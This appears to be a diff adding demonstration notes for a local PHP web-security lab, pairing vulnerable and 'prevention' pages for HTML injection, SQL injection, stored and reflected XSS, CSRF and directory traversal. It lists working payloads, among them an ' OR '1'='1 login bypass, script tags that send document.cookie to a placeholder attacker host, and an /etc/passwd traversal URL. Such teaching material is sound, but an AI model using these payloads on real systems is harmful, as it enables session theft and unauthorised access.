@@ -1,0 +1,136 @@
+HTML injection:
+---------------
+http://localhost:8888/php-security/html-injection/htmlinjection.php
+value=""/><hr/><input type = "submit" value = "HTML Injection"
+
+http://localhost:8888/php-security/html-injection/htmlinjectionprevention.php
+value=""/><hr/><input type = "submit" value = "HTML Injection"
+
+Hint: View page source!!!
+----
+
+SQL injection
+--------------
+http://localhost:8888/php-security/sql-injection/sqlinjection.php
+
+Attack: Login bypass attack / Successfully login, without knowing the username nor password!!!
+
+select * from user_info;
+
+In username field -> 
+newuser' OR '1'='1
+In password field -> 
+newuser' OR '1'='1
+
+
+Prevention mechanism
+--------------------
+http://localhost:8888/php-security/sql-injection/sqlinjectionprevention.php
+
+In username field -> 
+newuser' OR '1'='1
+In password field -> 
+newuser' OR '1'='1
+
+
+XSS
+---
+Stored XSS!!!
+-------------
+http://localhost:8888/php-security/xss/xss.php
+
+In comments box->
+<script>alert("Attempting xss attack!")</script>
+
+<script>window.location='http://www.google.com/'</script>
+
+To come out of this,
+/Applications/MAMP/Library/bin/mysql --host=localhost -uroot -proot
+use php-security
+select * from xss_demo;
+delete from xss_demo;
+
+Prevention mechanism
+--------------------
+http://localhost:8888/php-security/xss/xssprevention.php 
+
+
+Stealing cookies!!!
+------------------
+Stored XSS:
+----------
+HACKER MACHINE's IP address: X.X.X.X
+http://localhost:8888/php-security/xss/xss_stealcookies.php
+
+http://localhost:8888/php-security/xss/xss_stealcookiesprevention.php
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////////////////////////<script>window.location = 'http://localhost:8888/php-security/xss/hackerstealcookies/index.php?cookies='+encodeURI(document.cookie);</script>
+
+<script>window.location = 'http://X.X.X.X/hacker/stolencookies/index.php?cookies='+encodeURI(document.cookie);</script>
+
+After executing the above, it should redirect to the hackerstealcookies page!!!
+http://X.X.X.X/hacker/stolencookies/index.php
+
+
+Reflected XSS!!!
+----------------
+http://localhost:8888/php-security/xss/reflectedxss.php
+<script>alert("Attempting xss attack!")</script>
+
+
+xsrf/csrf
+---------
+http://localhost:8888/php-security/xsrf/xsrf.php
+
+Hacker's console: 
+   http://X.X.X.X/hacker/hacker.php
+
+
+http://localhost:8888/php-security/xsrf/check.php
+
+http://localhost:8888/php-security/xsrf/clear.php 
+
+Close the window!!!!!!!!!
+
+Prevention mechanism!
+---------------------
+http://localhost:8888/php-security/xsrf/xsrfprevention.php
+
+http://X.X.X.X/hacker/hackerfailed.php
+
+
+http://localhost:8888/php-security/xsrf/check.php
+
+http://localhost:8888/php-security/xsrf/clear.php 
+
+
+Stealing cookies from reflected xss!!!
+--------------------------------------
+<<Similar attack can be performed in fetching the cookies for reflected xss as well>>
+$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$
+///////////////////////////////////////////////////////////////////////////<script>location.href='http://X.X.X.X/hacker/reflectedxss_stolencookies/index.php?data="+document.cookie</script>
+$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$@@@@@@@@@$$$$$$$$$
+
+DirectoryTraversal attack
+-------------------------
+vulnerable code!
+http://X.X.X.X/directorytraversal/insecuredirectorytraversal.php?file=/etc/passwd
+
+fixed code!
+-----------
+http://X.X.X.X/directorytraversal/secureirectorytraversal.php?file=/etc/passwd
+
+
+hacker's ubuntu machine: X.X.X.X
+--------------------------------
+hackers directory:
+/var/www/html/hacker
+
+root@hackermachine:/var/www/html/hacker# ls -trl
+total 16
+-rw-r--r-- 1 root root 1517 Nov 11 02:43 hackerfailed.php
+-rw-r--r-- 1 root root 1506 Nov 11 02:43 hacker.php
+drwxrwxrwx 2 root root 4096 Nov 11 07:56 stolencookies
+drwxr-xr-x 2 root root 4096 Nov 11 08:06 reflectedxss_stolencookies
+root@hackermachine:/var/www/html/hacker# 
